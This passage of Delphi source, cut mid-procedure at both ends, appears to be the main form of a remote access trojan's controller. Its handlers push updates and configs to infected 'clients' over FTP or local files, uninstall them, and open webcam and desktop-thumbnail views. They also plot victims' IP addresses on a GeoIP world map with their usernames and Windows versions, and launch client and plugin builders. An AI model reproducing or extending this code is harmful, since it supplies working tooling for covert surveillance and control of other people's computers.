  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUPDATEFROMLOCAL + '|' + dlgOpen1.FileName + '|' +
      IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.F10Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormFTPManager;
  TmpNode: PVirtualNode;
  JSONConfig: TJSONConfig;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUPDATEFROMFTP + '|' + FtpHost + '|' + FtpUser + '|' +
      FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' + IntToStr(FtpPort));
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
  
  JSONConfig := TJSONConfig.Create(FTPSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('Ftp host', FtpHost);
  JSONConfig.WriteString('Ftp user', FtpUser);
  JSONConfig.WriteString('Ftp pass', FtpPass);
  JSONConfig.WriteString('Ftp directory', FtpDir);
  JSONConfig.WriteInteger('Ftp port', FtpPort);
  JSONConfig.SaveConfig;
  JSONConfig.Free;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormMain.U4Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  if MessageBox(Handle, 'Are you sure you want to uninstall selected client(s)?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUNINSTALL + '|');
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.U3Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;   
  TmpStr: string;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    TmpStr := GetUserFolder(ClientDatas.UserId);
    MyShellExecute(Handle, TmpStr, '', SW_SHOWNORMAL);
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.lvLogsCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormMain.btn10Click(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  TmpForm: TFormDnsUpdater;
  TmpStr: string;
begin
  TmpForm := TFormDnsUpdater.Create(Application);
  TmpForm.edtWan.Text := WanAddress;
  TmpForm.edtHost.Text := DNSHost;
  TmpForm.edtUser.Text := DNSUser;
  TmpForm.edtPass.Text := DNSPassword;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  DNSHost := TmpForm.edtHost.Text;
  DNSUser := TmpForm.edtUser.Text;
  DNSPassword := TmpForm.edtPass.Text;

  if (DNSHost = '') or (DNSUser = '') or (DNSPassword = '') or
    (TmpForm.edtWan.Text = '')
  then
  begin                                                                 
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  TmpForm.UpdateDNS;

  JSONConfig := TJSONConfig.Create(DNSSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('DNS host', DNSHost);
  JSONConfig.WriteString('DNS user', DNSUser);     
  JSONConfig.WriteString('DNS pass', DNSPassword);
  JSONConfig.WriteInteger('DNS provider', DNSProvider);
  JSONConfig.SaveConfig;
  JSONConfig.Free;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormMain.C6Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormManager;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    if ClientDatas.Forms[16] <> nil then TFormManager(ClientDatas.Forms[16]).Show else
    begin
      TmpForm := TFormManager.Create(Self, ClientDatas);
      ClientDatas.Forms[16] := TmpForm;
      TmpForm.Caption := 'Manager [' + ClientDatas.UserId + ']';
      TmpForm.Show;
    end;

    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.vrtlstrngtr1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if vrtlstrngtr1.SelectedCount = 0 then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Visible := False;
    pm1.Items[3].Visible := True;
    if ClientsList.Count <> 0 then pm1.Items[4].Visible := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Visible := True;
end;

procedure TFormMain.AddLog(Log: string; i: Integer; lColor: TColor);
var
  LogDatas: TLogDatas;
begin
  LogDatas.Action := '';
  LogDatas.Log := Log;
  LogDatas.i := i;
  LogDatas.lColor := lColor;
  SendMessage(Handle, WM_ADD_EVENTLOG, WParam(@LogDatas), 0);
end;

function TFormMain.RetrieveLogs: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lvLogs.Items.Count - 1 do
  begin
    Result := Result + IntToStr(lvLogs.Items.Item[i].ImageIndex) + '|';
    Result := Result + IntToStr(Integer(lvLogs.Items.Item[i].Data)) + '|';
    Result := Result + lvLogs.Items.Item[i].Caption + '|';
    Result := Result + lvLogs.Items.Item[i].SubItems.Strings[0] + '|';
    Result := Result + '|' + #13#10;
  end;
end;
              
procedure TFormMain.C3Click(Sender: TObject);
begin
  Application.CreateForm(TFormBuilder, FormBuilder);
  try
    FormBuilder.ShowModal;
  finally
    FormBuilder.Release;
    FormBuilder := nil;
  end;
end;

procedure TFormMain.P1Click(Sender: TObject);
begin
  Application.CreateForm(TFormPluginsBuilder, FormPluginsBuilder);
  try
    FormPluginsBuilder.ShowModal;
  finally
    FormPluginsBuilder.Release;
    FormPluginsBuilder := nil;
  end;
end;

function TFormMain.PlotLocations(Lat, Long: Double): TPoint;
begin
  Result.X := Round((873/360) * (180 + Long));
  Result.Y := Round((495/180) * (90 - Lat));

  img2.Canvas.Brush.Color := clRed;
  img2.Canvas.Pen.Color := clRed;
  img2.Canvas.Ellipse(Result.X - 3, Result.Y - 3, Result.X + 3, Result.Y + 3);
end;

procedure TFormMain.btn13Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpRes: TResourceStream;
  Stream: TMemoryStream;
  Bmp: TBitmap;
  jpg: TJPEGImage;
  i: Integer;
  Lat, Long: string;
  P: TPoint;
begin
  TmpRes := TResourceStream.Create(HInstance, 'WORLDMAP', 'worldmapfile');
  Stream := TMemoryStream.Create;
  Stream.LoadFromStream(TmpRes);
  Stream.Position := 0;
  TmpRes.Free;

  jpg := TJPEGImage.Create;
  jpg.LoadFromStream(Stream);
  Stream.Free;
  Bmp := TBitmap.Create;
  Bmp.Assign(jpg);
  Bmp.PixelFormat := pf24bit;
  jpg.Free;
  img2.Picture.Bitmap.Assign(Bmp);
  Bmp.Free;

  pnlMap.BringToFront;
  if ClientsList.Count = 0 then Exit;         

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    
    Lat := GeoIpLatitude(ClientDatas.WanIp);
    Long := GeoIpLongitude(ClientDatas.WanIp);
    if (Lat = '-') or (Long = '-') then Continue;

    P := PlotLocations(StrToInt(Lat), StrToInt(Long));
    ClientDatas.PositionX := P.X;
    ClientDatas.PositionY := P.Y;
  end;
end;

procedure TFormMain.img2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
var
  ClientDatas: TClientDatas;
  P: TPoint;
  i: Integer;
begin
  P.X := (X * 873) div img2.Width;
  P.Y := (Y * 495) div img2.Height;

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    if P.X <> ClientDatas.PositionX then pnl1.Visible := False else
    begin
      pnl1.Left := X + 1;
      pnl1.Top := Y + 1;
      lbl12.Caption := 'Address / Port: ' + ClientDatas.WanIp + ' / ' + ClientDatas.Infos.LocalPort;
      lbl11.Caption := 'Country: ' + ClientDatas.CountryName;
      lbl10.Caption := 'Username: ' + ClientDatas.Infos.User;
      lbl7.Caption := 'Windows: ' + ClientDatas.Infos.Windows;
      ilFlags.GetBitmap(ClientDatas.ImageIndex, img3.Picture.Bitmap);
      pnl1.Visible := True;
    end;
  end;
end;

procedure TFormMain.img2MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormManager;
  P: TPoint;
  i: Integer;
begin
  P.X := (X * 873) div img2.Width;
  P.Y := (Y * 495) div img2.Height;

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    if P.X = ClientDatas.PositionX then
    begin
      if ClientDatas.Forms[16] <> nil then TFormManager(ClientDatas.Forms[16]).Show else
      begin
        TmpForm := TFormManager.Create(Self, ClientDatas);
        ClientDatas.Forms[16] := TmpForm;
        TmpForm.Caption := 'Manager [' + ClientDatas.UserId + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.tmr1Timer(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if ClientsList.Count = 0 then Exit;
  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(PING + '|');
    ClientDatas.Ping := GetTickCount;
    ClientDatas.PingReceived := False;

    if (T1.Checked) and (ClientDatas.Node.CheckState = csCheckedNormal) then
    ClientDatas.SendDatas(DESKTOPTHUMBNAILVIEW + '|' + IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
  end;
end;

procedure TFormMain.S1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;                      
  TmpNode: PVirtualNode;
  JSONConfig: TJSONConfig;
  TmpStr: string;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0)) + 'Alarms';
  dlgOpen1.Filter := 'Wave file (*.wav)|*.wav';
  dlgOpen1.DefaultExt := 'wav';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    TmpStr := GetSettingsFolder(ClientDatas.UserId) + '\Alarm.settings';
    JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
    JSONConfig.WriteString('Alarm', dlgOpen1.FileName);
    JSONConfig.SaveConfig;
    JSONConfig.Free;
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.D3Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
  TmpStr: string;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    TmpStr := GetSettingsFolder(ClientDatas.UserId) + '\Alarm.settings';
    if FileExists(TmpStr) then DeleteFile(TmpStr);
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.D4Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode, TmpNode1: PVirtualNode;
  TmpItem: TListItem;
  i: Integer;
begin
  TmpNode := vrtlstrngtr1.GetFirst;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then
    begin
      TmpNode1 := TmpNode.FirstChild;
      for i := 0 to TmpNode.ChildCount - 1 do
      begin
        ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode1)^));
        if (ClientDatas = nil) or (TmpNode1.ChildCount > 0) then Continue;
        TmpItem := FormMultiDesktop.lvDesktop.Items.Add;
        TmpItem.Caption := ClientDatas.UserId;
        TmpItem.Data := ClientDatas;
        TmpNode1 := vrtlstrngtr1.GetNext(TmpNode1);
      end;
    end;
    TmpNode := vrtlstrngtr1.GetNext(TmpNode);
  end;

  FormMultiDesktop.Show;
end;

procedure TFormMain.W2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode, TmpNode1: PVirtualNode;
  TmpItem: TListItem;
  i: Integer;
begin
  TmpNode := vrtlstrngtr1.GetFirst;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then
    begin
      TmpNode1 := TmpNode.FirstChild;
      for i := 0 to TmpNode.ChildCount - 1 do
      begin
        ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode1)^));
        if (ClientDatas = nil) or (TmpNode1.ChildCount > 0) then Continue;
        if ClientDatas.Infos.WebCam = 'Not installed' then Continue;
        TmpItem := FormMultiWebcam.lvWebcam.Items.Add;
        TmpItem.Caption := ClientDatas.UserId;
        TmpItem.Data := ClientDatas;               
        TmpNode1 := vrtlstrngtr1.GetNext(TmpNode1);
      end;
    end;
    TmpNode := vrtlstrngtr1.GetNext(TmpNode);
  end;

  if FormMultiWebcam.lvWebcam.Items.Count = 0 then
  begin
    MessageBox(Handle,  'No webcam found.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  FormMultiWebcam.Show;
end;

procedure TFormMain.P2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(PING + '|');
    ClientDatas.Ping := GetTickCount;
    ClientDatas.PingReceived := False;   

    if (T1.Checked) and (ClientDatas.Node.CheckState = csCheckedNormal) then
    ClientDatas.SendDatas(DESKTOPTHUMBNAILVIEW + '|' + IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));

    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.tmr2Timer(Sender: TObject);
var
  ClientManager: TClientManager;
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if KeepAlive = False then Exit;
  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    if ClientDatas.PingReceived = False then Inc(ClientDatas.TimeOutCount);
    if ClientDatas.TimeOutCount = TimeOut * 60000 then
    begin
      ClientManager.ClientSocket := ClientDatas.ClientSocket;
      SendMessage(Handle, WM_REMOVE_CLIENT, WParam(@ClientManager), 0);  
      Application.ProcessMessages;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr1HeaderClick(Sender: TVTHeader;
  HitInfo: TVTHeaderHitInfo);
begin
  if HitInfo.Button = mbLeft then
  begin
    with Sender, Treeview do
    begin
      if HitInfo.Column <> MainColumn then SortColumn := NoColumn else
      begin
        if SortColumn = NoColumn then
        begin
          SortColumn := HitInfo.Column;
          SortDirection := sdAscending;
        end
        else
        begin
          if SortDirection = sdAscending then SortDirection := sdDescending else
            SortDirection := sdAscending;
        end;
        
        SortTree(SortColumn, SortDirection, False);
      end;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr1CompareNodes(Sender: TBaseVirtualTree;
  Node1, Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
var
  TmpClientDatas, TmpClientDatas1: PClientDatas;
begin
  TmpClientDatas := Sender.GetNodeData(Node1);
  if TmpClientDatas = nil then Exit;
  TmpClientDatas1 := Sender.GetNodeData(Node2);
  if TmpClientDatas1 = nil then Exit;

  if Column = 0 then
    Result := CompareText(TmpClientDatas^.Infos.GroupId, TmpClientDatas1^.Infos.GroupId);
end;

procedure TFormMain.vrtlstrngtr2CompareNodes(Sender: TBaseVirtualTree;
  Node1, Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
var
  TmpDBDatas, TmpDBDatas1: PDBDatas;
begin
  TmpDBDatas := Sender.GetNodeData(Node1);
  if TmpDBDatas = nil then Exit;
  TmpDBDatas1 := Sender.GetNodeData(Node2);
  if TmpDBDatas1 = nil then Exit;

  if Column = 0 then
    Result := CompareText(TmpDBDatas^.DBClientId, TmpDBDatas1^.DBClientId);
end;

procedure TFormMain.vrtlstrngtr2ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if vrtlstrngtr2.SelectedCount = 0 then
  begin
    for i := 0 to pm6.Items.Count - 1 do pm6.Items[i].Visible := False;
    pm6.Items[2].Visible := True;
    pm6.Items[3].Visible := True;
  end
  else for i := 0 to pm6.Items.Count - 1 do pm6.Items[i].Visible := True;
end;

procedure TFormMain.vrtlstrngtr2GetImageIndex(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
  var Ghosted: Boolean; var ImageIndex: Integer);
var
  NodePosition: Integer;
  DBDatas: PDBDatas;
  TmpStr: string;
  i: Integer;
begin
  NodePosition := Sender.GetNodeLevel(Node);
  if NodePosition < 0 then Exit;
  if not (Kind in [ikNormal, ikSelected]) then Exit;

  DBDatas := Sender.GetNodeData(Node);
  if DBDatas = nil then Exit;

  if NodePosition = 0 then
    if Column <> 0 then ImageIndex := -1 else ImageIndex := StrToInt(DBDatas^.DBInfos.ImageIndex)
  else

  if NodePosition = 1 then
  begin
    case Column of
      0: ImageIndex := 294;
      1: ImageIndex := -1;
      2: ImageIndex := -1;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr2GetNodeDataSize(Sender: TBaseVirtualTree;
  var NodeDataSize: Integer);
begin
  NodeDataSize := SizeOf(TDBDatas);
end;

procedure TFormMain.vrtlstrngtr2GetPopupMenu(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; const P: TPoint;
  var AskParent: Boolean; var PopupMenu: TPopupMenu);
begin
  PopupMenu := pm6;
end;

procedure TFormMain.vrtlstrngtr2GetText(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
  var CellText: WideString);
var
  NodePosition: Integer;
  DBDatas: PDBDatas;
  i: Integer;
begin
  NodePosition := Sender.GetNodeLevel(Node);
  if NodePosition < 0 then Exit;

  DBDatas := Sender.GetNodeData(Node);
  if DBDatas = nil then Exit;

  if NodePosition = 0 then
  begin
    if Column  <> 0 then CellText := '' else CellText := DBDatas^.DBClientId;
    vrtlstrngtr1.IsVisible[Node] := True;
  end
  else

  if NodePosition = 1 then
  begin                                  
    case Column of
      0: CellText := DBDatas^.DBInfos.OnConnectIdle + ' (Uptime: ' + DBDatas^.DBInfos.Uptime + ')';
      1: CellText := DBDatas^.DBInfos.User_Computer_Windows;
      2: CellText := DBDatas^.DBInfos.Version;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr2HeaderClick(Sender: TVTHeader;
  HitInfo: TVTHeaderHitInfo);
begin
  if HitInfo.Button = mbLeft then
  begin
    with Sender, Treeview do
    begin
      if HitInfo.Column <> MainColumn then SortColumn := NoColumn else
      begin
        if SortColumn = NoColumn then
        begin
          SortColumn := HitInfo.Column;
          SortDirection := sdAscending;
        end
        else
        begin
          if SortDirection = sdAscending then SortDirection := sdDescending else
            SortDirection := sdAscending;
        end;
        
        SortTree(SortColumn, SortDirection, False);
      end;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr2InitNode(Sender: TBaseVirtualTree;
  ParentNode, Node: PVirtualNode;
  var InitialStates: TVirtualNodeInitStates);
begin
  Node.CheckType := ctTriStateCheckBox;
  Sender.CheckState[Node] := csCheckedNormal;
  Sender.CheckState[Node] := csUnCheckedNormal;
end;

procedure TFormMain.vrtlstrngtr2MeasureItem(Sender: TBaseVirtualTree;
  TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
begin
  NodeHeight := vrtlstrngtr2.Images.Height;
end;

procedure TFormMain.E1Click(Sender: TObject);
var
  DBDatas: TDBDatas;
  TmpNode, TmpNode1: PVirtualNode;
  TmpStr: string;
  TmpForm: TFormRecords;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Users';
  if not DirectoryExists(TmpStr) then
  begin
    MessageBox(Handle, PChar('Repository folder "' + TmpStr + '" not found.'),
      PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  if vrtlstrngtr2.SelectedCount <> 1 then Exit;
  TmpNode := vrtlstrngtr2.GetFirstSelected;

  if TmpNode.ChildCount <= 0 then
    DBDatas := TDBDatas(PDBDatas(vrtlstrngtr2.GetNodeData(TmpNode.Parent)^))
  else DBDatas := TDBDatas(PDBDatas(vrtlstrngtr2.GetNodeData(TmpNode)^));

  if DBDatas = nil then Exit;
  if DBDatas.DBRecords <> nil then TFormRecords(DBDatas.DBRecords).Show else
  begin
    TmpForm := TFormRecords.Create(Self, DBDatas);
    DBDatas.DBRecords := TmpForm;
    TmpForm.Caption := DBDatas.DBClientId;
    TmpForm.Show;
  end;
end;

procedure TFormMain.C7Click(Sender: TObject);
begin
  vrtlstrngtr2.Clear;
  DeleteFile(DBFile);
end;

procedure TFormMain.R1Click(Sender: TObject);
begin
  SaveDBFile;
  DBDatasList := TStringList.Create;
  LoadDBFile;
end;

procedure TFormMain.L1Click(Sender: TObject);
var
  TmpList: TStringList;
  TmpList1: TStringArray;
  TmpStr, TmpStr1: string;
  i, j: Integer;
  TmpItem: TListItem;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Logs';
  if not DirectoryExists(TmpStr) then
  begin
    MessageBox(Handle, PChar('Logs folder "' + TmpStr + '" not found.'), PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  SaveLogsDatas;

  TmpList := TStringList.Create;
  ListFiles(TmpStr, '*.log', TmpList);

  if TmpList.Text = '' then
  begin
    MessageBox(Handle, 'Logs not found.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  lvLogs.Clear;

  j := 0;
  for i := TmpList.Count - 1 downto 0 do
  begin
    TmpStr := FileToStr(TmpList.Strings[i]);
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);

    lvLogs.Items.BeginUpdate;
    
    while Pos(#13#10, TmpStr) > 0 do
    begin
      Application.ProcessMessages;
      TmpStr1 := Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1);
      Delete(TmpStr, 1, Pos(#13#10, TmpStr));
      TmpList1 := ParseString('|', TmpStr1);

      TmpItem := lvLogs.Items.Add;
      TmpItem.Caption := TmpList1[2];
      TmpItem.SubItems.Add(TmpList1[3]);
      if TmpList1[0] = ' -1' then TmpItem.ImageIndex := -1 else
        TmpItem.ImageIndex := StrToInt(Trim(TmpList1[0]));
      TmpItem.Data := Pointer(StrToInt(TmpList1[1]));
      SendMessage(lvLogs.Handle, WM_VSCROLL, SB_LINEDOWN, 0);
    end;

    lvLogs.Items.EndUpdate;
    Inc(j);
    if j >= 7 then Break;
  end;

  TmpList.Free;
end;

procedure TFormMain.C8Click(Sender: TObject);
begin
  lvLogs.Clear;
  btn6.Caption := 'Events log';
end;

procedure TFormMain.C9Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
  TmpStr: string;
  TmpBool: Boolean;
  i: Integer;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0)) + 'Profiles';
  dlgOpen1.Filter := 'Configuration file (*.config)|*.config';
  dlgOpen1.DefaultExt := 'config';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpStr := FileToStr(dlgOpen1.FileName);
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  i := StringCount('|', TmpStr);

  if i <> 42 then
  begin
    MessageBox(Handle, 'This file is not a valid configuration file.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  case MessageBox(Handle, 'Do you want to restart client after update?', PROGRAMINFOS,
    MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES: TmpBool := True;
    IDNO: TmpBool := False;
    IDCANCEL: Exit;
  end;

  TmpStr := MyReplaceStr(TmpStr, '|', '?');              
  TmpNode := vrtlstrngtr1.GetFirstSelected;
  
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUPDATECONFIG + '|' + TmpStr + '|' + MyBoolToStr(TmpBool));
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.L2Click(Sender: TObject);
var
  TmpList: TStringList;
  TmpList1: TStringArray;
  TmpStr, TmpStr1: string;
  i, j: Integer;
  TmpItem: TListItem;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Logs';
  if not DirectoryExists(TmpStr) then
  begin
    MessageBox(Handle, PChar('Logs folder "' + TmpStr + '" not found.'),
      PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  SaveLogsDatas;

  TmpList := TStringList.Create;
  ListFiles(TmpStr, '*.log', TmpList);

  if TmpList.Text = '' then
  begin
    MessageBox(Handle, 'Logs not found.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  lvLogs.Clear;

  j := 0;
  for i := TmpList.Count - 1 downto 0 do
  begin
    TmpStr := FileToStr(TmpList.Strings[i]);
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);

    lvLogs.Items.BeginUpdate;
    
    while Pos(#13#10, TmpStr) > 0 do
    begin
      Application.ProcessMessages;
      TmpStr1 := Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1);
      Delete(TmpStr, 1, Pos(#13#10, TmpStr));
      TmpList1 := ParseString('|', TmpStr1);

